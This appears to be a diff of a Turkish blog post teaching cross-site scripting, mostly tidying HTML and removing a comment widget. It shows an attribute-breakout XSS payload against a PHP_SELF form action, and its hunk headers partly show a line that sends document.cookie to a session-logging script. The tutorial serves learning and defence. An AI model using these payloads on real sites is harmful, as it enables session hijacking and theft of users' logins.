-<img alt="xss-case7-html-source-code2" src="/img/xss-case7-html-source-code2.jpg"/> </p>
-<p>Bir sonraki örneğimizde bizi bir input karşılıyor ancak bizim input ile işimiz olmayacak. Sayfanın kaynak kodlarına baktığımızda form etikemizin action niteliğinde sayfamızın olduğunu göreceğiz. Bu nedenle sayfamızın url yapısını mıncıklayacağız biraz. Çünkü url kısmına ne yazılır ise form etiketnin action niteliğinin değeri olarak atanıyor. O halde aşağıdaki payload çalışacaktır.<br/>
-<code>/" onmouseover="alert(1)</code><br/>
-/” ile action niteliğimizin değerini kapadık. Daha sonra onmouseover adında bir js eventı tanımladık ancak payloadın sonuna “(çift tırnak) atmadık çünkü tırnağı kendisi tamamlayacak.<br/>
-<img alt="xss-case8-html-source-code" src="/img/xss-case8-html-source-code.jpg"/> </p>
+<img alt="xss-case7-html-source-code2" src="/img/xss-case7-html-source-code2.jpg"> </img></p>
+<p>Bir sonraki örneğimizde bizi bir input karşılıyor ancak bizim input ile işimiz olmayacak. Sayfanın kaynak kodlarına baktığımızda form etikemizin action niteliğinde sayfamızın olduğunu göreceğiz. Bu nedenle sayfamızın url yapısını mıncıklayacağız biraz. Çünkü url kısmına ne yazılır ise form etiketnin action niteliğinin değeri olarak atanıyor. O halde aşağıdaki payload çalışacaktır.<br>
+<code>/" onmouseover="alert(1)</code><br>
+/” ile action niteliğimizin değerini kapadık. Daha sonra onmouseover adında bir js eventı tanımladık ancak payloadın sonuna “(çift tırnak) atmadık çünkü tırnağı kendisi tamamlayacak.<br>
+<img alt="xss-case8-html-source-code" src="/img/xss-case8-html-source-code.jpg"> </img></br></br></br></p>
 <p>Kaynak koda baktığımızda payloadımızın cuk diye oturduğunu görüyoruz zaten.
-Aşağıdaki resimde ise php kaynak kodlarını görüyoruz. Htmlentities fonksiyonu kullanılarak input’tan gelen zararlı karakterler filtrelenmiş. Ancak form etiketinin action niteliğinde <code>PHP_SELF</code> kullanılmış. Yani formdan gönderilecek herhangi bir very aynı sayfada işlenecek. Bizde tam olarak bu kısmı kullanarak payload geliştirdik.<br/>
-<img alt="xss-case8-source-code" src="/img/xss-case8-source-code.jpg"/> </p>
+Aşağıdaki resimde ise php kaynak kodlarını görüyoruz. Htmlentities fonksiyonu kullanılarak input’tan gelen zararlı karakterler filtrelenmiş. Ancak form etiketinin action niteliğinde <code>PHP_SELF</code> kullanılmış. Yani formdan gönderilecek herhangi bir very aynı sayfada işlenecek. Bizde tam olarak bu kısmı kullanarak payload geliştirdik.<br>
+<img alt="xss-case8-source-code" src="/img/xss-case8-source-code.jpg"> </img></br></p>
 <p><br/></p>
 <h4 id="bonussiz-cozun"><strong>BONUS(Siz Çözün):</strong></h4>
 <p>Şimdiye kadar gördüğümüz örnek caselere dayanarak bu örneği çözmenizi bekliyorum. Çünkü yukarıdakileri okuyup anladıysanız biraz kafa yorarak rahatlıkla zafiyeti ortaya çıkaracak payloadı yazabilirsiniz. Payloadları yorum kısmına bekliyorum :)  </p>
@@ -423,8 +423,8 @@ Aşağıdaki resimde ise php kaynak kodlarını görüyoruz. Htmlentities fonksi
 </pre></div>
 <p><br/></p>
 <h2 id="ornek-bir-senaryo"><strong>Örnek bir senaryo</strong></h2>
-<p>Şimdiye kadar gördülerimiz ile bir sistemde olan xss zafiyetini ortaya çıkarmak için ne tür/nasıl payloadlar geliştireceğimizi gördük. Peki iyi güzel de bir sitede xss zafiyetinin olması neyi ifade ediyor tam anlamıyla? Neden bu kadar tehlikeli? Bug bounty programlarında neden para veriliyor bu zafiyete? Saldırganlar bu zafiyeti nasıl istismar ediyor? Şimdi bu sorulara uygulamalı cevap verme zamanı. Örnek bir site üzerinde bulacağımız bir xss zafiyeti ile kullanıcın oturum bilgilerinin nasıl ele geçirileceğini göreceğiz.<br/>
-Oracle ve php ile CRUD(Create, Read, Update, Delete) işlemlerini yapan basit bir web uygulaması yazmıştım zamanında örnek senaryamozu bu uygulama üzerinde anlatacağım. Scripti <a href="https://github.com/musana">buradan</a> indirebilirsiniz. (Scriptin çalışması için oracle express edition programını kurmanız gerekmektedir.)  </p>
+<p>Şimdiye kadar gördülerimiz ile bir sistemde olan xss zafiyetini ortaya çıkarmak için ne tür/nasıl payloadlar geliştireceğimizi gördük. Peki iyi güzel de bir sitede xss zafiyetinin olması neyi ifade ediyor tam anlamıyla? Neden bu kadar tehlikeli? Bug bounty programlarında neden para veriliyor bu zafiyete? Saldırganlar bu zafiyeti nasıl istismar ediyor? Şimdi bu sorulara uygulamalı cevap verme zamanı. Örnek bir site üzerinde bulacağımız bir xss zafiyeti ile kullanıcın oturum bilgilerinin nasıl ele geçirileceğini göreceğiz.<br>
+Oracle ve php ile CRUD(Create, Read, Update, Delete) işlemlerini yapan basit bir web uygulaması yazmıştım zamanında örnek senaryamozu bu uygulama üzerinde anlatacağım. Scripti <a href="https://github.com/musana">buradan</a> indirebilirsiniz. (Scriptin çalışması için oracle express edition programını kurmanız gerekmektedir.)  </br></p>
 <p>Burdan sonrasını video ile anlatmak daha iyi olacak sanırım. Yazı zaten yeterince uzun ne siz sıkılın ne ben yorulayım :)</p>
 <p>Videoda herşeyi açık bir şekilde göstermeye çalıştım. Aklınıza takılan bir yer olursa veya scripti çalıştırmada sorun yaşarsanız yorum bölümüne yazmanız yeterli.  </p>
 <div class="youtube-video">
@@ -455,17 +455,17 @@ $("#ifrm").attr("src", ("http://127.0.0.1/session_log/snif.php?x="+document.cook
 <h2 id="son-soz"><strong>SON SÖZ</strong></h2>
 <p>Bu yazıda elimden geldiği kadar konuyu temelden alarak anlatmaya çalıştım. Amacım, xss konusunda bu yazıyı okuyanları belli bir seviyeye getirmektir. Bir geliştiricinin kodlayacağı sistemde böyle bir zafiyet bırakmaması için gerekli önlemleri almasını veya bir güvenlik araştırmacısının ezbersiz bir şekilde payload geliştirebilecek bir seviyeye gelmesini hedefledim. Bu yazıyı okuduktan sonra sakın xss zafiyetini tam öğrendim hissine kapılmayın! Bu konu çok geniş ve sürekli güncel tutulması gerekir. Bu zafiyeti istismar etmek için birçok metod ve binlerce <a href="https://github.com/foospidy/payloads/tree/master/other/xss">xss payloadı</a> mevcut. Ben sadece zafiyetin mantalitesini anlatıp birkaç case ve bir örnek senaryo ile pekiştirmeye çalıştım. Faydası dokunduysa sizlere ne mutlu bana.</p>
 <p>Google'da xss zafiyetinin ne kadar tehlikeli olduğunu bildiğinden eğitici bir <a href="https://xss-game.appspot.com/">challenge</a> hazırlamış. Belki uğraşmak isteyabilirsiniz. Ayrıca Black Hat Asia '15 konferansında sunulan dom based xss ile ilgili pdf dökümümanını da <a href="https://www.blackhat.com/docs/asia-15/materials/asia-15-Johns-Client-Side-Protection-Against-DOM-Based-XSS-Done-Right-(tm)">buradan</a> incelemek isteyebilirsiniz.   </p>
-<p>Bu arada yazıda gördüğünüz eksiklikleri, hatalı bilgileri veya yazım yanlışlarını bildirirseniz minnettar kalırım.<br/>
- Güvenlik konusu sizde bilirsiniz ki sürekli güncel tutulması gerekilen bir konudur. Var olan zafiyetlere yeni teknikler eklenmenin yanında yeni zafiyet türleride geliştirilmektedir/bulunmaktadır. Bu nedenle kendinizi bu konularda güncel tutmanız ve motivasyonunuzu kaybetmememiz temennisiyle. Sağlıcakla kalınız.  </p>
-<p><font style="font-size:0.6em"><strong>Not:</strong> Bu yazı zamanla güncellenebilir.</font></p>
+<p>Bu arada yazıda gördüğünüz eksiklikleri, hatalı bilgileri veya yazım yanlışlarını bildirirseniz minnettar kalırım.<br>
+ Güvenlik konusu sizde bilirsiniz ki sürekli güncel tutulması gerekilen bir konudur. Var olan zafiyetlere yeni teknikler eklenmenin yanında yeni zafiyet türleride geliştirilmektedir/bulunmaktadır. Bu nedenle kendinizi bu konularda güncel tutmanız ve motivasyonunuzu kaybetmememiz temennisiyle. Sağlıcakla kalınız.  </br></p>
+<p><font style="font-size:0.6em"><strong>Not:</strong> Bu yazı zamanla güncellenebilir.</font></p></hr>
 
 
 <section style="font-size:0.7em; margin-bottom:-15px;">
     <p id="post-share-links">
         Paylaş:
-        <a href="http://twitter.com/home?status=b'Cross%20Site%20Scripting%20http%3A//musana.net/xss-detayli-dokuman.html'" target="_blank" title="Bu yazıyı twitter'da paylaş">Twitter</a>
+        <a href="http://twitter.com/home?status=b'Cross%20Site%20Scripting%20/yazilar/2016/xss-detayli-dokuman.html'" target="_blank" title="Bu yazıyı twitter'da paylaş">Twitter</a>
         ❄
-        <a href="http://www.facebook.com/sharer/sharer.php?u=http%3A//musana.net/xss-detayli-dokuman.html" target="_blank" title="Bu yazıyı facebook'ta paylaş">Facebook</a>
+        <a href="http://www.facebook.com/sharer/sharer.php?u=/yazilar/2016/xss-detayli-dokuman.html" target="_blank" title="Bu yazıyı facebook'ta paylaş">Facebook</a>
     </p>
 </section>
 
@@ -480,11 +480,11 @@ $("#ifrm").attr("src", ("http://127.0.0.1/session_log/snif.php?x="+document.cook
 
  
                <li class="makale-bilgi">Tarih: </li>
-    	       <li> <time pubdate="pubdate" datetime="2016-10-17T00:00:00+03:00">Oct 17, 2016</time></li>
+    	       <li> <time pubdate="pubdate" datetime="2016-10-17T00:00:00+03:00">Eki 17, 2016</time></li>
 
  
                  <li class="makale-bilgi">Güncelleme: </li>
-                    <li> <time pubdate="pubdate" datetime="2016-10-17T00:00:00+03:00">Oct 17, 2016</time></li>
+                    <li> <time pubdate="pubdate" datetime="2016-10-17T00:00:00+03:00">Eki 17, 2016</time></li>
 
        
                 <li class="makale-bilgi">Kategori: </li>
@@ -510,10 +510,7 @@ $("#ifrm").attr("src", ("http://127.0.0.1/session_log/snif.php?x="+document.cook
                     <span>1</span>
 </a></li>
 		 <li class="etiket"><a href="/tags.html#xss-auditor-ref">xss-auditor
-                    <span>2</span>
-</a></li>
-		 <li class="etiket"><a href="/tags.html#xss-auditor-ref">xss-auditor
-                    <span>2</span>
+                    <span>1</span>
 </a></li>
 		 <li class="etiket"><a href="/tags.html#xss-döküman-ref">xss-döküman
                     <span>1</span>
@@ -535,37 +532,6 @@ $("#ifrm").attr("src", ("http://127.0.0.1/session_log/snif.php?x="+document.cook
 
 
 
-<section>
-<div class="accordion" id="accordion2">
-    <div class="accordion-group">
-        <div class="accordion-heading">
-            <a class="accordion-toggle disqus-comment-count" data-parent="#accordion2"
-                href="http://musana.net/xss-detayli-dokuman.html#disqus_thread">
-                Yorumlar
-            </a>
-        </div>
-        <div id="disqus_thread" class="accordion-body">
-            <div class="accordion-inner">
-                <div class="comments">
-<div id="disqus_thread"></div>
-<script type="text/javascript">
-    var disqus_shortname = '0xmusana';
-        var disqus_identifier = 'http://musana.net/xss-detayli-dokuman.html';
-    var disqus_url = 'http://musana.net/xss-detayli-dokuman.html';
-
-    (function() {
-         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-         dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-         (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-     })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>                </div>
-            </div>
-        </div>
-    </div>
-</div>
-</section>
 
         </div>
 
@@ -575,7 +541,7 @@ $("#ifrm").attr("src", ("http://127.0.0.1/session_log/snif.php?x="+document.cook
             <nav>
             <ul class="articles_timeline">
  
-                <li class="next_article"><a href="http://musana.net/vim-editor-ipuclari.html" title="Next: Vim'i Özelleştirmek">Vim'i Özelleştirmek</a> »</li>
+                <li class="next_article"><a href="/yazilar/2016/vim-editor-ipuclari.html" title="Next: Vim'i Özelleştirmek">Vim'i Özelleştirmek</a> »</li>
             </ul>
             </nav>
             </aside>
@@ -594,8 +560,8 @@ $("#ifrm").attr("src", ("http://127.0.0.1/session_log/snif.php?x="+document.cook
         <li class="elegant-power">Bu sitedeki bütün içerikler izinsiz kopyalanabilir, değiştirilebilir ve dağıtılabilirdir, ama yine de kaynak belirtmeniz tavsiye edilir. ;) <a href="http://getpelican.com/" title="Pelican Home Page"> Pelican</a> ile geliştirilmiştir.</li>
     </ul>
 </div>
-</footer>            <script src="../theme/tipuesearch/jquery.min.js"></script>
-        <script src="../theme/tipuesearch/bootstrap.min.js"></script>
+</footer>            <script src="/theme/tipuesearch/jquery.min.js"></script>
+        <script src="/theme/tipuesearch/bootstrap.min.js"></script>
         <script>
             function validateForm(query)
             {
@@ -603,31 +569,5 @@ $("#ifrm").attr("src", ("http://127.0.0.1/session_log/snif.php?x="+document.cook
             }
         </script>
 
-<script type="text/javascript">
-    var disqus_shortname = '0xmusana';
-
-    (function () {
-        var s = document.createElement('script'); s.async = true;
-        s.type = 'text/javascript';
-        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
-        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
-    }());
-    </script>
-        <script  language="javascript" type="text/javascript">
-            function uncollapse() {
-                var hash_str = window.location.hash;
-                if (window.location.hash.match(/^#comment-\d+$/))
-                {
-                    var hash_str = '#disqus_thread';
-                }
-                $(hash_str).collapse({
-                    toggle: true
-                    })
-            }
-        </script>
-
-        <script type="text/javascript" language="JavaScript">
-            uncollapse(); 
-        </script>
     </body>
 </html>
